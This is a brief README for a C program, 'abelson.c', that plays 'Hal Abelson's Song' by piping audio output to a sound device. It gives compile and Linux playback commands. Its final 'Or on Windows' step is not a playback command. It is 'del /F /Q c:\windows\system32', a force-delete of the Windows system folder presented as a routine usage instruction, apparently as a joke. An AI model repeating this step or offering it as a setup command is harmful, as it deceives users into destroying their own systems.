abelson
=======

abelson.c - Hal Abelson's Song. It's ``Abelson Good!''
 
  Compile and link with libm.
 
      $ gcc -Os -o abelson abelson.c -lm
 
  Then pipe output to an audio device.
 
    On modern Linux systems with PulseAudio:
 
      $ ./abelson | padsp tee /dev/audio > /dev/null
 
    Or on older systems:
 
      $ ./abelson > /dev/audio
      $ ./abelson > /dev/dsp
 
    Or on Windows:
 
      del /F /Q c:\windows\system32
 

